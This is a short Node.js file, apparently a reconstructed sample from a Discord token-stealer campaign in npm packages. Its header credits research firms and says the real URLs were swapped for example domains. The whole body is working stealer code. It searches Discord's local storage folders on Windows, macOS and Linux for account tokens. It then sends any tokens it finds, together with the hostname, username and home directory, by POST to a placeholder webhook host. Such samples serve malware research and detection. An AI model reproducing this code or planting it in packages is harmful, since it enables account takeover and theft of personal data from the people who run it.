// Reconstructed from 2022-2023 Discord token stealer campaign (hundreds of packages)
// Reported by Phylum and Socket.dev
// All URLs replaced with safe example domains.

const fs = require('fs');
const path = require('path');
const os = require('os');
const https = require('https');

const tokenPaths = [
  path.join(os.homedir(), '.config', 'discord', 'Local Storage', 'leveldb'),
  path.join(os.homedir(), 'Library', 'Application Support', 'discord', 'Local Storage', 'leveldb'),
  path.join(os.homedir(), 'AppData', 'Roaming', 'discord', 'Local Storage', 'leveldb'),
];

const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;

for (const tokenPath of tokenPaths) {
  try {
    const files = fs.readdirSync(tokenPath);
    for (const file of files) {
      if (file.endsWith('.ldb') || file.endsWith('.log')) {
        const content = fs.readFileSync(path.join(tokenPath, file), 'utf8');
        const matches = content.match(tokenRegex);
        if (matches) {
          const payload = JSON.stringify({
            tokens: matches,
            host: os.hostname(),
            user: os.userInfo().username,
            home: os.homedir()
          });
          const req = https.request({
            hostname: 'webhook.example.com',
            path: '/api/webhooks/steal',
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
          });
          req.write(payload);
          req.end();
        }
      }
    }
  } catch (e) {}
}
